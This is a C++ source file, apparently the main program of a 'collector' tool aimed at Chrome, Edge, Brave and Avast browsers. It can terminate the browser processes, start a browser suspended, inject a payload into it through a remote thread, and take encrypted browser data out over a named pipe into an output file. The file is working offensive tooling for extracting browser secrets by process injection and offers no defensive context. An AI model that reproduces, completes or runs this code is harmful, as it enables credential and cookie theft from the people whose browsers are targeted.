#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "../injector/browser_discovery.hpp"
#include "../injector/browser_terminator.hpp"
#include "../injector/process_manager.hpp"
#include "../injector/pipe_server.hpp"
#include "../injector/injector.hpp"
#include <fstream>

using namespace Injector;

int wmain(int argc, wchar_t* argv[]) {
    std::cout << "Collector starting..." << std::endl;
    std::ofstream log("collector_debug.log");
    if (!log.is_open()) {
        std::cerr << "Failed to open debug log" << std::endl;
        return 1;
    }
    log << "Collector started at " << GetTickCount() << std::endl;
    log.flush();

    bool verbose = false;
    bool killBrowsers = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v") {
            verbose = true;
            log << "Verbose enabled" << std::endl;
            log.flush();
        }
        else if (arg == L"--kill" || arg == L"-k") {
            killBrowsers = true;
            log << "Kill enabled" << std::endl;
            log.flush();
        }
        else if (arg == L"--target" || arg == L"-t") {
            if (i + 1 < argc) {
                targetType = argv[++i];
                log << "Target: " << Core::ToUtf8(targetType) << std::endl;
                log.flush();
            }
        }
        else if (arg == L"--output" || arg == L"-o") {
            if (i + 1 < argc) {
                output = argv[++i];
                log << "Output path: " << output.string() << std::endl;
                log.flush();
            }
        }
        else if (arg == L"--help" || arg == L"-h") {
            std::wcout << L"Usage: collector.exe [options] [all|<browser>]\n\n"
                << L"Options:\n"
                << L"  -v, --verbose           Show detailed output\n"
                << L"  -k, --kill              Kill browser processes before extraction\n"
                << L"  -t, --target <browser>  Target specific browser (chrome, edge, brave, avast, all)\n"
                << L"  -o, --output <dir>      Output directory (default: ./output)\n"
                << L"  -h, --help              Show this help\n";
            return 0;
        }
        else if (arg[0] != L'-') {
            targetType = arg;
            log << "Target (positional): " << Core::ToUtf8(targetType) << std::endl;
            log.flush();
        }
    }

    if (targetType.empty()) {
        targetType = L"all";
        log << "No target specified, defaulting to 'all'" << std::endl;
        log.flush();
    }

    Core::Console console(verbose);
    log << "Console created" << std::endl;
    log.flush();

    if (!Sys::InitApi(verbose)) {
        console.Error("Syscall initialization failed");
        log << "ERROR: Sys::InitApi returned false" << std::endl;
        log.flush();
        return 1;
    }
    log << "Syscall initialization successful" << std::endl;
    log.flush();

    try {
        std::filesystem::create_directories(output);
        log << "Output directory created: " << output.string() << std::endl;
        log.flush();
    }
    catch (const std::exception& e) {
        console.Error("Failed to create output directory: " + std::string(e.what()));
        log << "ERROR creating output directory: " << e.what() << std::endl;
        log.flush();
        return 1;
    }

    std::vector<BrowserInfo> browsers;
    if (targetType == L"all") {
        browsers = BrowserDiscovery::FindAll();
        log << "FindAll returned " << browsers.size() << " browsers" << std::endl;
        log.flush();
    }
    else {
        auto single = BrowserDiscovery::FindSpecific(targetType);
        if (single.has_value()) {
            browsers.push_back(single.value());
            log << "FindSpecific found browser: " << Core::ToUtf8(targetType) << std::endl;
            log.flush();
        }
        else {
            log << "FindSpecific failed for target: " << Core::ToUtf8(targetType) << std::endl;
            log.flush();
        }
    }

    if (browsers.empty()) {
        console.Warn("No supported browsers found. Check that at least one of Chrome, Edge, Brave, or Avast is installed.");
        log << "No browsers found, exiting" << std::endl;
        log.flush();
        return 0;
    }

    for (const auto& browser : browsers) {
        log << "Processing browser: " << browser.displayName
            << " at " << Core::ToUtf8(browser.fullPath) << std::endl;
        log.flush();
        console.BrowserHeader(browser.displayName, browser.version);

        bool fileSaved = false;

        try {
            if (killBrowsers) {
                console.Debug("Terminating browser processes...");
                log << "Terminating processes for " << Core::ToUtf8(browser.exeName) << std::endl;
                log.flush();
                BrowserTerminator terminator(console);
                TerminationOptions opts;
                opts.terminateChildren = true;
                opts.waitForExit = true;
                auto termStats = terminator.KillByExeName(browser.exeName, opts);
                log << "Terminated " << termStats.processesTerminated << " processes" << std::endl;
                log.flush();
                Sleep(300);
            }

            console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
            ProcessManager procMgr(browser);
            procMgr.CreateSuspended();
            log << "Process created with PID: " << procMgr.GetPid() << std::endl;
            log.flush();
            console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");

            PipeServer pipe(browser.type);
            pipe.Create();
            log << "Pipe created: " << Core::ToUtf8(pipe.GetName()) << std::endl;
            log.flush();
            console.Debug("  [+] IPC pipe: " + Core::ToUtf8(pipe.GetName()));

            PayloadInjector injector(procMgr, console);
            injector.Inject(pipe.GetName());
            log << "Payload injected (remote thread suspended)" << std::endl;
            log.flush();

            console.Debug("Awaiting payload connection...");
            log << "About to resume payload thread" << std::endl; log.flush();
            injector.ResumeRemoteThread();
            Sleep(100);
            log << "Payload thread resumed, waiting for connection" << std::endl; log.flush();
            pipe.WaitForClient();

            log << "Payload thread resumed" << std::endl;
            log.flush();
            console.Debug("  [+] Payload connected");

            pipe.SendConfig(verbose, false, output);
            log << "Configuration sent to payload" << std::endl;
            log.flush();

            // Use ProcessMessagesWithConfirmation to get file write status from payload
            bool payloadSuccess = false;
            std::string payloadError;
            pipe.ProcessMessagesWithConfirmation(verbose, payloadSuccess, payloadError);
            log << "Message processing completed" << std::endl;
            log.flush();

            // Wait for the browser process to exit (payload may need time to write file)
            HANDLE hProcess = procMgr.GetProcessHandle();
            if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
                DWORD waitResult = WaitForSingleObject(hProcess, 30000);  // 30 seconds timeout
                if (waitResult != WAIT_OBJECT_0) {
                    log << "Payload did not exit within timeout, force-terminating" << std::endl;
                    log.flush();
                    console.Debug("  [!] Payload timeout – force terminating");
                    procMgr.Terminate();
                }
                else {
                    log << "Process exited cleanly" << std::endl;
                    log.flush();
                }
            }
            else {
                procMgr.Terminate();
            }

            // Check payload confirmation status first
            if (payloadSuccess) {
                fileSaved = true;
                console.Success("Encrypted data saved successfully");
                log << "Payload confirmed file write success" << std::endl;
                log.flush();
            }
            else if (!payloadError.empty()) {
                console.Error("Payload file write failed: " + payloadError);
                log << "ERROR: Payload reported file write failure: " << payloadError << std::endl;
                log.flush();
            }
            else {
                // Fallback: verify that encrypted.json was actually created
                std::filesystem::path jsonPath = output / "encrypted.json";
                if (std::filesystem::exists(jsonPath) && std::filesystem::file_size(jsonPath) > 0) {
                    fileSaved = true;
                    console.Success("Encrypted data saved to " + jsonPath.string());
                    log << "File verified: " << jsonPath.string() << " size " << std::filesystem::file_size(jsonPath) << std::endl;
                }
                else {
                    console.Error("Failed to save encrypted data – file missing or empty");
                    log << "ERROR: encrypted.json not found or empty after browser process exit" << std::endl;
                    log << "Check %temp%\\collector_payload_debug.log for details" << std::endl;
                }
            }
        }
        catch (const std::exception& e) {
            console.Error(std::string("Exception: ") + e.what());
            log << "EXCEPTION: " << e.what() << std::endl;
            log.flush();
        }

        if (!fileSaved) {
            console.Error("Encrypted data was not saved for " + browser.displayName);
        }
    }

    log << "Collector finished successfully" << std::endl;
    log.flush();
    log.close();
    return 0;
}
